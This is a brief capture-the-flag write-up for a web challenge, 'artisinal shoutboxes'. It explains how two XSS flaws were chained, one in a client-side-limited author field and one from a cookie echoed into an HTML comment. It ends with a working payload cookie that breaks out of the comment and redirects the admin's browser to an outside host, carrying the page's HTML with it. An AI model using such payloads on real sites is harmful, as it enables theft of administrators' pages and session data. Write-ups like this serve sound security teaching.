# artisinal shoutboxes (cloud, 200pts)

 * we could upload message with an author to a subdomain.
 * admin viewed each sent message
 * there were 2 xss
 * one was in the author field, it was limited to 10 chars but that was only enforced on user side
 * second was on `admin.combined.space`, cookie was being printed in a comment
 * use first xss to setup second xss(using a cookie) and redirect the admin to `admin.combined.space`
 * set the cookie prefix to `-->` to bypass the comment and then send the whole document to yourself on a different server.
 * final cookie: `trolled=--><script>window.location='http://nazywam.host/'+document.documentelement.innerhtml</script><!--;domain=.combined.space;path=/` 
